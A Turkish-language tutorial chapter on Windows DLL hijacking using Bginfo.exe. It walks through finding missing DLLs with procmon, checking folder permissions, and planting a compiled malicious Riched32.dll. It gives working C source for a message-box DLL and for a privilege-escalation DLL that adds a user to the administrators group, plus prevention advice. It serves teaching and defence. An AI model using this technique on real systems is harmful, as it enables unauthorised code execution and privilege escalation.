\newpage
\subsection{6. Windows'ta DLL kaçırma (DLL Hijacking). Basit bir C örneği.}

﷽

![DLL hijacking](./images/8/2021-09-25_12-09.png){width="75%"}

DLL kaçırma (DLL Hijacking) nedir? DLL kaçırma, meşru/güvenilir bir uygulamayı, kötü amaçlı bir DLL'yi yüklemeye kandırma tekniğidir.     

Windows ortamlarında, bir uygulama veya hizmet başlatılırken düzgün çalışması için bir dizi DLL arar. İşte Windows'ta varsayılan DLL arama sırasını gösteren bir diyagram:    

![DLL hijacking](./images/8/dllhijack.png){width="75%"}

Bu yazımızda yalnızca en basit durumu ele alacağız: bir uygulamanın dizininin yazılabilir olması. Bu durumda, uygulama tarafından yüklenen herhangi bir DLL kaçırılabilir, çünkü arama sürecinde kullanılan ilk konum burasıdır.     

### Adım 1. Eksik DLL'leri olan süreci bulun

Bir sistemde eksik DLL'leri bulmanın en yaygın yolu, sysinternals aracından [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) çalıştırmaktır. Aşağıdaki filtreleri ayarlayın:

![procmon with filters](./images/8/2021-09-25_11-52.png){width="75%"}

Bu, uygulamanın yüklemeye çalıştığı herhangi bir DLL olup olmadığını ve eksik DLL'i aradığı gerçek yolu belirleyecektir:     

![procmon missing dlls](./images/8/2021-09-25_11-53.png){width="75%"}

Örneğimizde, `Bginfo.exe` süreci birkaç eksik DLL'e sahip ve bu DLL'ler muhtemelen DLL kaçırma için kullanılabilir. Örneğin, `Riched32.dll`.  

### Adım 2. Klasör izinlerini kontrol edin

Klasör izinlerini kontrol etmek için şu komutu çalıştırın:

```powershell
icacls C:\Users\user\Desktop\
```

![folder permissions](./images/8/2021-09-25_14-42.png){width="75%"}

[Belgelerde](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls) belirtildiği üzere, bu klasöre yazma erişimimiz var.    

### Adım 3. DLL Kaçırma

Öncelikle, `bginfo.exe`'yi çalıştırın:     
![run bginfo](./images/8/2021-09-25_11-54.png){width="75%"}

Bu nedenle, `bginfo.exe` ile aynı dizine `Riched32.dll` adında bir DLL yerleştirirsem, bu araç çalıştırıldığında kötü niyetli kodum da çalıştırılacaktır. Basitlik açısından, sadece bir mesaj kutusu açan bir DLL oluşturuyorum:   

```cpp
/*
DLL hijacking example
author: @cocomelonc
*/

#include <windows.h>
#pragma comment (lib, "user32.lib")

BOOL APIENTRY DllMain(HMODULE hModule, 
DWORD  ul_reason_for_call, LPVOID lpReserved) {
  switch (ul_reason_for_call)  {
  case DLL_PROCESS_ATTACH:
    MessageBox(
      NULL,
      "Meow-meow!",
      "=^..^=",
      MB_OK
    );
    break;
  case DLL_PROCESS_DETACH:
    break;
  case DLL_THREAD_ATTACH:
    break;
  case DLL_THREAD_DETACH:
    break;
  }
  return TRUE;
}
```

Derlemek için (saldırgan makinesinde):     

```bash
x86_64-w64-mingw32-gcc -shared -o evil.dll evil.c
```

![compile DLL](./images/8/2021-09-25_11-58.png){width="75%"}

Sonra DLL'in adını `Riched32.dll` olarak değiştirip, `C:\Users\user\Desktop\` DLL  dizinine kopyalayacağız:

![replace DLL](./images/8/2021-09-25_14-54.png){width="75%"}

Şimdi `bginfo.exe`'yi başlatın:     

![run process 1](./images/8/2021-09-25_12-00.png){width="75%"}

![run process 2](./images/8/2021-09-25_12-04.png){width="75%"}

Gördüğünüz gibi, kötü amaçlı mantığımız çalıştırıldı:    

`bginfo.exe` ve kötü amaçlı Riched32.dll aynı klasörde bulunuyor **(1)**      
`bginfo.exe` başlatılıyor **(2)**   
Mesaj kutusu açılıyor! **(3)**       

### Önleme

En basit önleme adımları, tüm yüklü yazılımların korunan `C:\Program Files` veya `C:\Program Files (x86)` dizinlerine kurulmasını sağlamaktır. Eğer yazılım bu konumlara yüklenemiyorsa, bir sonraki en kolay çözüm, kurulum dizinine yalnızca Yönetici (Administrative) kullanıcıların "oluşturma" veya "yazma" izinlerine sahip olmasını sağlamaktır. Bu, saldırganın kötü amaçlı bir DLL yerleştirerek sömürüyü gerçekleştirmesini engeller.     

### Yetki Yükseltme 

DLL kaçırma, yalnızca kod çalıştırmak için değil, aynı zamanda kalıcılık ve yetki yükseltme elde etmek için de kullanılabilir:     

Diğer yetkilerle çalışan veya çalışacak bir süreç bulun (yatay/lateral hareket) ve eksik bir DLL arayın.     
DLL'nin aranacağı herhangi bir klasörde (muhtemelen çalıştırılabilir dosya dizini veya sistem yolu içindeki bir klasör) yazma izniniz olduğundan emin olun.    
Ardından, kodumuzu aşağıdaki gibi değiştirin:    

```cpp
/*
DLL hijacking example
author: @cocomelonc
*/

#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, 
DWORD ul_reason_for_call, LPVOID lpReserved) {
  switch (ul_reason_for_call)  {
  case DLL_PROCESS_ATTACH:
    system("cmd.exe /k net localgroup administrators user /add");
    break;
  case DLL_PROCESS_DETACH:
    break;
  case DLL_THREAD_ATTACH:
    break;
  case DLL_THREAD_DETACH:
    break;
  }
  return TRUE;
}

```

*Derleme, x64 için: x86_64-w64-mingw32-gcc evil.c -shared -o target.dll*          
*x86 için: i686-w64-mingw32-gcc evil.c -shared -o target.dll*      

Sonraki adımlar öncekiyle aynıdır. DLL'yi hedef süreç dizinine yerleştirin ve çalıştırılabilir dosyayı başlatın. Bu kod, kullanıcıyı “administrators" grubuna ekleyecektir.    

### Sonuç

Ancak her durumda, bir uyarı var.     

Bazı durumlarda, derlediğiniz DLL'nin, kurban süreci tarafından yüklenebilmesi için birden fazla fonksiyonu dışa aktarması gerekebilir. Bu fonksiyonlar yoksa, çalıştırılabilir dosya DLL'yi yükleyemez ve sömürü başarısız olur.  

Mevcut DLL'lerin özel sürümlerini derlemek, göründüğünden daha zorlu olabilir, çünkü birçok çalıştırılabilir dosya, gerekli prosedürler veya giriş noktaları eksikse bu tür DLL'leri yüklemez. [DLL Export Viewer](https://www.nirsoft.net/utils/dll_export_viewer.html) gibi araçlar, meşru DLL'lerin tüm dış fonksiyon adlarını ve sıralamalarını listelemek için kullanılabilir. Derlenen DLL'nin aynı formatı takip ettiğinden emin olmak, başarıyla yüklenme olasılığını artıracaktır.  

Gelecekte, bu konuyu anlamaya çalışacağım ve hedef orijinal DLL'den bir `.def` dosyası oluşturan bir Python script'ini yazmayı deneyeceğim.     

Kullanılan araçlar ve yöntemler:     
[Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)     
[icacls](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls)    
[DLL Export Viewer](https://www.nirsoft.net/utils/dll_export_viewer.html)      
[Module-Definition (def) files](https://docs.microsoft.com/en-us/cpp/build/reference/module-definition-dot-def-files?view=msvc-160&viewFallbackFrom=vs-2019)

[Github’taki kaynak kod](https://github.com/cocomelonc/2021-09-24-dllhijack)     

Not: Denemek isterseniz, savunmasız bginfo (sürüm 4.16) GitHub'a eklendi.    
